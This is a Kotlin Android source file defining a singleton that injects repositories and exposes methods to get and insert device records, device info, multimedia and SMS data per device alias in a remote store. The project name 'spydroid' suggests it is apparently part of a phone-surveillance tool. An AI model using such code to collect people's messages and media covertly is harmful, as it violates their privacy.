/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.common.remote

import android.annotation.SuppressLint
import android.content.Context
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import net.spydroid.common.remote.data.dataModule
import net.spydroid.common.remote.domain.DevicesRepository
import net.spydroid.common.remote.domain.InfoRepository
import net.spydroid.common.remote.domain.MultimediaRepository
import net.spydroid.common.remote.domain.SmsRepository
import net.spydroid.common.remote.network.models.Devices
import net.spydroid.common.remote.network.models.InfoDevices
import net.spydroid.common.remote.network.models.MultimediaDevices
import net.spydroid.common.remote.network.models.SmsDevices
import net.spydroid.common.remote.network.networkModule
import org.koin.android.ext.koin.androidContext
import org.koin.core.component.KoinComponent
import org.koin.core.component.inject
import org.koin.core.context.startKoin

class RemoteDataProvider private constructor(
    private val context: Context
) : KoinComponent {

    private val devicesRepository: DevicesRepository by inject()
    private val infoRepository: InfoRepository by inject()
    private val multimediaRepository: MultimediaRepository by inject()
    private val smsRepository: SmsRepository by inject()

    private val scope = CoroutineScope(Dispatchers.IO)

    init {
        startKoin {
            androidContext(context)
            modules(networkModule, dataModule)
        }
    }

    private val _devices = MutableStateFlow(mutableListOf<Devices>())
    val devices: StateFlow<List<Devices>> = _devices

    private val _info = MutableStateFlow(mutableListOf<InfoDevices>())
    val info: StateFlow<List<InfoDevices>> = _info

    private val _multimedia = MutableStateFlow(mutableListOf<MultimediaDevices>())
    val multimedia: StateFlow<List<MultimediaDevices>> = _multimedia

    private val _sms = MutableStateFlow(mutableListOf<SmsDevices>())
    val sms: StateFlow<List<SmsDevices>> = _sms

    private fun setDevice(device: Devices) =
        scope.launch {
            devicesRepository.insertDevice(device)
        }


    // GET
    fun getAllDevices() =
        scope.launch {
            devicesRepository.getAllDevices().map {
                val updateList = _devices.value.toMutableList().apply {
                    add(it)
                }
                _devices.value = updateList
            }
        }

    fun getDevice(alias: String) =
        scope.launch {
            devicesRepository.getDevice(alias).map {
                val updateList = _devices.value.toMutableList().apply {
                    add(it)
                }
                _devices.value = updateList
            }
        }

    fun getAllInfo() =
        scope.launch {
            infoRepository.getAllInfo().map {
                val updateLIst = _info.value.toMutableList().apply { add(it) }
                _info.value = updateLIst
            }
        }

    fun getInfo(alias: String) =
        scope.launch {
            infoRepository.getInfo(alias).map {
                val updateLIst = _info.value.toMutableList().apply { add(it) }
                _info.value = updateLIst
            }
        }

    fun getAllMultimedia() =
        scope.launch {
            multimediaRepository.getAllMultimedia().map {
                val updateList = _multimedia.value.toMutableList().apply {
                    add(it)
                }
                _multimedia.value = updateList
            }
        }

    fun getMultimedia(alias: String) =
        scope.launch {
            multimediaRepository.getMultimedia(alias).map {
                val updateList = _multimedia.value.toMutableList().apply {
                    add(it)
                }
                _multimedia.value = updateList
            }
        }

    fun getAllSms() =
        scope.launch {
            smsRepository.getAllSms().map {
                val updateList = _sms.value.toMutableList().apply {
                    add(it)
                }
                _sms.value = updateList
            }
        }

    fun getSms(alias: String) =
        scope.launch {
            smsRepository.getSms(alias).map {
                val updateList = _sms.value.toMutableList().apply {
                    add(it)
                }
                _sms.value = updateList
            }
        }


    fun insertDevice(device: Devices) =
        scope.launch {
            devicesRepository.insertDevice(device)
        }

    fun insertInfo(info: InfoDevices) =
        scope.launch {
            infoRepository.insertInfo(info)
        }

    fun insertMultimedia(multimedia: MultimediaDevices) =
        scope.launch {
            multimediaRepository.insertMultimedia(multimedia)
        }

    fun insertSms(sms: SmsDevices) =
        scope.launch {
            smsRepository.insertSms(sms)
        }


    companion object {
        @SuppressLint("StaticFieldLeak")
        @Volatile
        private var INSTANCE: RemoteDataProvider? = null

        fun current(context: Context): RemoteDataProvider =
            INSTANCE ?: synchronized(this) {
                INSTANCE ?: RemoteDataProvider(context.applicationContext)
                    .also { INSTANCE = it }
            }
    }

}